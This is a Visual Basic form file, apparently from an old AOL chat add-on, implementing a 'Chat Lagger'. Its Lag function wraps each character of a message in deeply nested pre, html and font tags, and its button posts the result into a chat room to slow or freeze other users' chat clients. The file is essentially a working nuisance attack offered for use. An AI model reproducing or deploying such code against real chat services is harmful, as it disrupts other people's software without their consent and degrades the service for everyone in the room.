VERSION 4.00
Begin VB.Form Form35 
   BackColor       =   &H00FF0000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Chat Lagger"
   ClientHeight    =   870
   ClientLeft      =   3465
   ClientTop       =   4170
   ClientWidth     =   3180
   Height          =   1335
   Left            =   3405
   LinkTopic       =   "Form35"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   870
   ScaleWidth      =   3180
   ShowInTaskbar   =   0   'False
   Top             =   3765
   Width           =   3300
   Begin VB.CommandButton Command1 
      Caption         =   "Send Lag"
      Height          =   255
      Left            =   720
      TabIndex        =   1
      Top             =   480
      Width           =   1695
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      MaxLength       =   21
      TabIndex        =   0
      Text            =   "Text To Lag"
      Top             =   120
      Width           =   2895
   End
End
Attribute VB_Name = "Form35"
Attribute VB_Creatable = False
Attribute VB_Exposed = False
Private Sub Command1_Click()
ChatSend Lag(Text1.Text)
End Sub

Private Sub Form_Load()
Top = 0
Left = 0
Me.Picture = Form1.image2.Picture
FFX.StayOnTop Me
Form1.Hide
End Sub

Function Lag(thetext As String)
G$ = thetext$
A = Len(G$)
 Dim s$
For w = 1 To A Step 3
    r$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><pre><html><pre><html><pre><html><pre><html><pre><html><pre><html>" & r$ & "</html></pre></html></pre></html></pre></html></pre></html></pre></html></pre>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><pre><html><pre><html><pre><html><pre><html>" & s$ & "</html></pre></html></pre></html></pre></html></pre>"
Next w
Lag = p$
End Function


Private Sub Form_Unload(Cancel As Integer)
Form1.Visible = True
Unload Me
End Sub


